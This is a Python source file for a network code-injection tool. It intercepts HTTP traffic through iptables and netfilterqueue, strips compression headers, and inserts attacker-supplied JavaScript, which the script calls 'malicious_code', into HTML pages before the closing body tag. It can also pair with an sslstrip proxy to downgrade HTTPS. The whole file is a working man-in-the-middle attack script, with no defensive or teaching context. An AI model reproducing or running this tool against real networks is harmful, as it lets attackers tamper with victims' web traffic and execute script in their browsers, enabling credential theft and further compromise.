import subprocess
import netfilterqueue
import argparse
import scapy.layers.l2 as l2
import scapy.all as scapy
import scapy.layers.inet as inet
import re

class CodeInjector:

    def __init__(self, injected_code, use_sslstrip_proxy=False):
        self.use_sslstrip_proxy = use_sslstrip_proxy
        self.injected_code = injected_code

    def __init_queue(self):
        if self.use_sslstrip_proxy:
            subprocess.check_call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
            subprocess.check_call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        else:
            subprocess.check_call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

    def __restore(self):
        subprocess.check_call("sudo iptables --flush", shell=True)
        print("[+] Table was restored")

    def __modify_packet(self, old_packet, new_scapy_packet):
        del new_scapy_packet[inet.IP].len
        del new_scapy_packet[inet.IP].chksum
        del new_scapy_packet[inet.TCP].chksum
        old_packet.set_payload(new_scapy_packet.build())

    def __process_packet(self, packet):
        scapy_packet = inet.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(inet.TCP):
            if scapy_packet[inet.TCP].dport in {8080, 80}:
                data_raw = scapy_packet[scapy.Raw].load.decode('iso-8859-1')
                #downgrade from http/1.1 to http/1.0
                data_raw = data_raw.replace("HTTP/1.1\\r\\n","HTTP/1.0\\r\\n")
                scapy_packet[scapy.Raw].load = re.sub("Accept-Encoding:.*?\\r\\n","",
                    data_raw)
                self.__modify_packet(packet, scapy_packet)
            elif scapy_packet[inet.TCP].sport in {8080, 80}:
                body_tag = None
                data_raw = scapy_packet[scapy.Raw].load.decode('iso-8859-1')
                if data_raw.find("</body>") >= 0:
                    body_tag = "</body>"
                if data_raw.find("</BODY>") >= 0:
                    body_tag = "</BODY>"
                injected_data_raw = "<script>" + self.injected_code + "</script>"
                content_length = re.search("(Content-Length:\s)(\d*?)(\\r\\n)", data_raw)
                upgrade_packet = True
                if content_length and "text/html" in data_raw:
                    content_length = int(content_length.group(2))
                    print(content_length)
                    content_length = content_length + len(injected_data_raw)

                    data_raw = re.sub("(Content-Length:\s)(\d*?)(\\r\\n)",
                        "Content-Length: " + str(content_length) + "\\r\\n", data_raw)
                    upgrade_packet = True
                if body_tag is not None:
                    data_raw = data_raw.replace(body_tag,
                        injected_data_raw + body_tag)
                    upgrade_packet = True
                    print("============INJECT CODE===============")
                if upgrade_packet:
                    scapy_packet[scapy.Raw].load = data_raw
                    self.__modify_packet(packet, scapy_packet)
        packet.accept()

    def start_injector(self):
        try:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, self.__process_packet)
            self.__init_queue()
            queue.run()
        except KeyboardInterrupt:
            self.__restore()        


parser = argparse.ArgumentParser(description='Code injection tool')
parser.add_argument("--file", help="path to file that contain javascript injected code", required=True)
parser.add_argument("--use_proxy", help="Set true if you want to use another proxy that downgrade https to http."
                        + "This server must use port 8080.", default=False)
args = parser.parse_args()
file_path = args.file
use_proxy = args.use_proxy
with open(file=file_path, mode="r") as file_code:
    malicious_code = file_code.read()
    code_injector = CodeInjector(injected_code=malicious_code, use_sslstrip_proxy=use_proxy)
    code_injector.start_injector()


